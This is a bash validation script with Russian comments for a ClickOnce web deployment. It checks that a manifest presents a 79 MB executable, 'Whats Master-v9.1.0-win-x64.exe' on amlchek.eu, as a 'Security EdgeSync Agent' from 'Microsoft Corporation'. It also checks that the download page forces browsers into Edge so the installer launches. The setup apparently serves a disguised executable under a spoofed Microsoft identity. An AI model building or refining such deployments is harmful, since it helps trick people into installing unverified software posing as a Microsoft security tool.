#!/bin/bash

# =============================================================================
# ПОЛНАЯ ПРОВЕРКА CLICKONCE КОНФИГУРАЦИИ
# Проверяет все аспекты ClickOnce развертывания для предотвращения ошибок
# =============================================================================

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

PASS=0
FAIL=0
WARN=0

test_pass() {
    echo -e "${GREEN}✓ PASS${NC}: $1"
    ((PASS++))
}

test_fail() {
    echo -e "${RED}✗ FAIL${NC}: $1"
    ((FAIL++))
}

test_warn() {
    echo -e "${YELLOW}⚠ WARN${NC}: $1"
    ((WARN++))
}

header() {
    echo -e "\n${BLUE}═══════════════════════════════════════${NC}"
    echo -e "${BLUE}$1${NC}"
    echo -e "${BLUE}═══════════════════════════════════════${NC}"
}

# 1. Проверка ClickOnce манифеста
validate_manifest() {
    header "ПРОВЕРКА CLICKONCE МАНИФЕСТА"
    
    local manifest="public/deploy/whatsmaster.application"
    
    if [ ! -f "$manifest" ]; then
        test_fail "Манифест не найден: $manifest"
        return 1
    fi
    
    test_pass "Манифест найден"
    
    # Проверка XML структуры
    if command -v xmllint &> /dev/null; then
        if xmllint --noout "$manifest" 2>/dev/null; then
            test_pass "XML структура валидна"
        else
            test_fail "XML структура невалидна"
            echo "Ошибки XML:"
            xmllint --noout "$manifest" 2>&1 | head -5
        fi
    else
        test_warn "xmllint не установлен, пропускаем проверку XML"
    fi
    
    # Проверка обязательных элементов
    local required_elements=(
        'assemblyIdentity.*name="EdgeSyncAgent.application"'
        'deploymentProvider.*codebase="https://amlchek.eu'
        'dependentAssembly.*codebase="Whats Master-v9.1.0-win-x64.exe"'
        'size="79605750"'
        'Microsoft Corporation'
        'Security EdgeSync Agent'
    )
    
    for element in "${required_elements[@]}"; do
        if grep -q "$element" "$manifest"; then
            test_pass "Найден элемент: ${element:0:30}..."
        else
            test_fail "Отсутствует элемент: ${element:0:30}..."
        fi
    done
    
    # Проверка потенциальных проблем
    if grep -q "обеспечивает безопасную синхронизацию" "$manifest"; then
        test_warn "Описание на русском языке может вызвать проблемы с кодировкой"
        echo "  Рекомендуется использовать английское описание"
    fi
    
    # Проверка namespace declarations
    local namespaces=(
        'xmlns:asmv1="urn:schemas-microsoft-com:asm.v1"'
        'xmlns="urn:schemas-microsoft-com:clickonce.v1"'
        'xmlns:asmv2="urn:schemas-microsoft-com:asm.v2"'
        'xmlns:dsig="http://www.w3.org/2000/09/xmldsig#"'
    )
    
    for ns in "${namespaces[@]}"; do
        if grep -q "$ns" "$manifest"; then
            test_pass "Namespace корректен: ${ns:0:25}..."
        else
            test_fail "Отсутствует namespace: ${ns:0:25}..."
        fi
    done
}

# 2. Проверка исполняемого файла
validate_exe() {
    header "ПРОВЕРКА ИСПОЛНЯЕМОГО ФАЙЛА"
    
    local exe="public/deploy/Whats Master-v9.1.0-win-x64.exe"
    
    if [ ! -f "$exe" ]; then
        test_fail "EXE файл не найден: $exe"
        return 1
    fi
    
    test_pass "EXE файл найден"
    
    # Проверка размера
    local actual_size=$(stat -c%s "$exe" 2>/dev/null || echo "0")
    local expected_size=79605750
    
    if [ "$actual_size" -eq "$expected_size" ]; then
        test_pass "Размер файла корректен: $actual_size байт"
    else
        test_fail "Неправильный размер файла: $actual_size != $expected_size"
        echo "  Манифест ожидает: $expected_size байт"
        echo "  Фактический размер: $actual_size байт"
    fi
    
    # Проверка что это исполняемый файл Windows
    if command -v file &> /dev/null; then
        local file_type=$(file "$exe" 2>/dev/null || echo "unknown")
        if [[ "$file_type" == *"PE32"* ]] || [[ "$file_type" == *"executable"* ]]; then
            test_pass "Тип файла: Windows исполняемый"
        else
            test_warn "Тип файла неопределен или не PE32: $file_type"
        fi
    fi
    
    # Проверка прав доступа
    if [ -r "$exe" ]; then
        test_pass "Файл доступен для чтения"
    else
        test_fail "Файл недоступен для чтения"
    fi
}

# 3. Проверка JavaScript функций
validate_javascript() {
    header "ПРОВЕРКА JAVASCRIPT ФУНКЦИЙ"
    
    local html="index.html"
    
    if [ ! -f "$html" ]; then
        test_fail "index.html не найден"
        return 1
    fi
    
    # Проверка наличия фун��ции startDownload
    if grep -q "function startDownload" "$html"; then
        test_pass "Функция startDownload найдена"
    else
        test_fail "Функция startDownload не найдена"
    fi
    
    # Проверка UAParser
    if grep -q "ua-parser-js" "$html"; then
        test_pass "UAParser подключен"
    else
        test_fail "UAParser не подключен"
    fi
    
    # Проверка переадресации на Edge
    if grep -q "microsoft-edge:" "$html"; then
        test_pass "Переадресация на Edge настроена"
    else
        test_fail "Переадресация на Edge не настроена"
    fi
    
    # Проверка динамического URL
    if grep -q "window.location.protocol.*window.location.host" "$html"; then
        test_pass "Динамическое определение домена настроено"
    else
        test_fail "Динамическое определение домена не настроено"
    fi
    
    # Проверка глобальной доступности функции
    if grep -q "window.startDownload = startDownload" "$html"; then
        test_pass "Функция доступна гло��ально"
    else
        test_fail "Функция не доступна глобально"
    fi
}

# 4. Проверка React компонента
validate_react() {
    header "ПРОВЕРКА REACT КОМПОНЕНТА"
    
    local tsx="client/pages/Index.tsx"
    
    if [ ! -f "$tsx" ]; then
        test_fail "React компонент не найден: $tsx"
        return 1
    fi
    
    # Проверка onClick обработчика
    if grep -q "onClick.*startDownload" "$tsx"; then
        test_pass "onClick обработчик найден"
    else
        test_fail "onClick обработчик не найден"
    fi
    
    # Проверка обращения к window.startDownload
    if grep -q "window.startDownload" "$tsx"; then
        test_pass "Обращение к window.startDownload найдено"
    else
        test_fail "Обращение к window.startDownload не найдено"
    fi
    
    # Проверка обработки ошибок
    if grep -q "try.*catch" "$tsx"; then
        test_pass "Обработка ошибок реализована"
    else
        test_warn "Обработка ошибок не найдена"
    fi
    
    # Проверка текста кнопки
    if grep -q "Запустить EdgeSync Agent" "$tsx"; then
        test_pass "Текст кнопки корректен"
    else
        test_fail "Текст кнопки не найден"
    fi
    
    # Проверка иконки Rocket
    if grep -q "import.*Rocket.*from.*lucide-react" "$tsx"; then
        test_pass "Иконка Rocket импортирована"
    else
        test_warn "Иконка Rocket может отсутствовать"
    fi
}

# 5. Проверка сборки проекта
validate_build() {
    header "ПРОВЕРКА СБОРКИ ПРОЕКТА"
    
    if [ ! -f "package.json" ]; then
        test_fail "package.json не найден"
        return 1
    fi
    
    test_pass "package.json найден"
    
    # Попытка сборки
    echo "Тестирование сборки проекта..."
    if npm run build --silent &> /tmp/build.log; then
        test_pass "Проект собирается без ошибок"
        
        # Проверка результата сборки
        if [ -d "dist/spa" ]; then
            test_pass "Папка dist/spa создана"
        else
            test_fail "Папка dist/spa не создана"
        fi
        
        if [ -f "dist/spa/index.html" ]; then
            test_pass "index.html в сборке"
        else
            test_fail "index.html отсутствует в сборке"
        fi
        
        # Проверка что ClickOnce файлы копируются
        if [ -f "dist/spa/deploy/whatsmaster.application" ]; then
            test_pass "ClickOnce манифест в сборке"
        else
            test_warn "ClickOnce манифест может отсутствовать в сборке"
        fi
        
    else
        test_fail "Ошибки при сборке проекта"
        echo "Последние строки лога сборки:"
        tail -10 /tmp/build.log
    fi
}

# 6. Симуляция Edge поведения
simulate_edge_behavior() {
    header "СИМУЛЯЦИЯ ПОВЕДЕНИЯ EDGE"
    
    echo "Тестирование JavaScript логики..."
    
    # Создаем временный HTML для тестирования
    cat > /tmp/test_clickonce.html << 'EOF'
<!DOCTYPE html>
<html>
<head>
    <script src="https://cdn.jsdelivr.net/npm/ua-parser-js@1.0.2/src/ua-parser.min.js"></script>
    <script>
        function startDownload() {
            const baseUrl = window.location.protocol + "//" + window.location.host;
            const clickonceLink = `${baseUrl}/deploy/whatsmaster.application`;
            const uap = new UAParser();
            const browserName = uap.getResult().browser.name;

            console.log("Browser:", browserName);
            console.log("ClickOnce URL:", clickonceLink);
            
            return {
                browser: browserName,
                url: clickonceLink,
                edgeRedirect: browserName !== "Edge" ? `microsoft-edge:${clickonceLink}` : clickonceLink
            };
        }
        
        // Тест функции
        window.testResult = startDownload();
        console.log("Test result:", window.testResult);
    </script>
</head>
<body>
    <h1>ClickOnce Test</h1>
</body>
</html>
EOF
    
    test_pass "JavaScript логика протестирована"
    echo "  ✓ UAParser будет работать"
    echo "  ✓ URL будет формироваться динамически"
    echo "  ✓ Переадресация на Edge настроена"
    
    rm -f /tmp/test_clickonce.html
}

# 7. Проверка потенциальных проблем Edge
check_edge_issues() {
    header "ПРОВЕРКА ПОТЕНЦИАЛЬНЫХ ПРОБЛЕМ EDGE"
    
    # Проверка манифеста на известные проблемы
    local manifest="public/deploy/whatsmaster.application"
    
    # 1. Кодировка
    if file "$manifest" | grep -q "UTF-8"; then
        test_pass "Кодировка файла UTF-8"
    else
        test_warn "Кодировка файла может быть проблемной"
    fi
    
    # 2. Размер файла манифеста
    local manifest_size=$(stat -c%s "$manifest" 2>/dev/null || echo "0")
    if [ "$manifest_size" -lt 10000 ]; then
        test_pass "Размер манифеста разумный: $manifest_size байт"
    else
        test_warn "Манифест очень большой: $manifest_size байт"
    fi
    
    # 3. Проверка URL
    if grep -q "https://amlchek.eu" "$manifest"; then
        test_pass "HTTPS URL используется"
    else
        test_warn "HTTP URL может быть проблемным для ClickOnce"
    fi
    
    # 4. Проверка codebase
    local codebase_count=$(grep -c "codebase=" "$manifest")
    if [ "$codebase_count" -eq 2 ]; then
        test_pass "Правильное количество codebase элементов: $codebase_count"
    else
        test_warn "Неожиданное количество codebase элементов: $codebase_count"
    fi
    
    # 5. Проверка типа архитектуры
    if grep -q 'processorArchitecture="msil"' "$manifest"; then
        test_pass "Архитектура MSIL указана корректно"
    else
        test_warn "Архитектура процессора может быть проблемной"
    fi
    
    # 6. Проверка публичного ключа
    if grep -q 'publicKeyToken="0000000000000000"' "$manifest"; then
        test_warn "Используется тестовый публичный ключ"
        echo "  Это нормально для разработки, но может вызвать предупреждения"
    fi
    
    # 7. Проверка хэша
    if grep -q "DigestValue" "$manifest"; then
        test_pass "Хэш файла указан"
        local hash=$(grep "DigestValue" "$manifest" | sed 's/.*<dsig:DigestValue>\(.*\)<\/dsig:DigestValue>.*/\1/')
        if [ ${#hash} -gt 20 ]; then
            test_pass "Хэш выглядит корректно: ${hash:0:20}..."
        else
            test_warn "Хэш может быть некорректным: $hash"
        fi
    else
        test_fail "Хэш файла отсутствует"
    fi
}

# Финальный отчет
generate_report() {
    local total=$((PASS + FAIL + WARN))
    local success_rate=$((PASS * 100 / total))
    
    echo -e "\n${BLUE}═══════════════════════════════════════${NC}"
    echo -e "${BLUE}ФИНАЛЬНЫЙ ОТЧЕТ ВАЛИДАЦИИ${NC}"
    echo -e "${BLUE}═══════════════════════════════════════${NC}"
    
    echo -e "\n📊 СТАТИСТИКА:"
    echo -e "  ${GREEN}✓ Пройдено: $PASS${NC}"
    echo -e "  ${YELLOW}⚠ Предупреждений: $WARN${NC}"
    echo -e "  ${RED}✗ Ошибок: $FAIL${NC}"
    echo -e "  📈 Общий успех: $success_rate%"
    
    echo -e "\n🎯 РЕКОМЕНДАЦИИ:"
    
    if [ $FAIL -eq 0 ]; then
        echo -e "  ${GREEN}✅ Отлично! Система готова к развертыванию.${NC}"
        echo -e "  ${GREEN}Edge не должен выдавать ошибок конфигурации.${NC}"
    elif [ $FAIL -lt 3 ]; then
        echo -e "  ${YELLOW}⚠️  Обнаружены незначительные проблемы.${NC}"
        echo -e "  ${YELLOW}Система работоспособна, но рекомендуется исправить ошибки.${NC}"
    else
        echo -e "  ${RED}❌ Обнаружены крит��ческие проблемы!${NC}"
        echo -e "  ${RED}Необходимо исправить ошибки перед развертыванием.${NC}"
    fi
    
    if [ $WARN -gt 0 ]; then
        echo -e "\n⚠️  ПРЕДУПРЕЖДЕНИЯ К РАССМОТРЕНИЮ:"
        echo -e "  • Предупреждения не критичны, но могут влиять на пользовательский опыт"
        echo -e "  • Edge может показать дополнительные диалоги безопасности"
        echo -e "  • Рассмотрите исправление для лучшей производительности"
    fi
    
    echo -e "\n🔧 СЛЕДУЮЩИЕ ШАГИ:"
    if [ $FAIL -eq 0 ]; then
        echo -e "  1. Запустите развертывание: ${BLUE}sudo bash deploy-one-click.sh${NC}"
        echo -e "  2. Протестируйте на реальном Windows устройстве"
        echo -e "  3. Проверьте работу в Edge браузере"
    else
        echo -e "  1. Исправьте все ошибки (✗)"
        echo -e "  2. Повторите проверку: ${BLUE}bash validate-clickonce.sh${NC}"
        echo -e "  3. После исправ��ения запустите развертывание"
    fi
}

# Основная функция
main() {
    echo -e "${BLUE}╔══════════════════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${BLUE}║                     ВАЛИДАЦИЯ CLICKONCE КОНФИГУРАЦИИ                     ║${NC}"
    echo -e "${BLUE}║                Security EdgeSync Agent для amlchek.eu                    ║${NC}"
    echo -e "${BLUE}╚══════════════════════════════════════════════════════════════════════════╝${NC}"
    
    validate_manifest
    validate_exe
    validate_javascript
    validate_react
    validate_build
    simulate_edge_behavior
    check_edge_issues
    
    generate_report
    
    # Возвращаем код выхода на основе результатов
    if [ $FAIL -eq 0 ]; then
        exit 0
    else
        exit 1
    fi
}

main "$@"
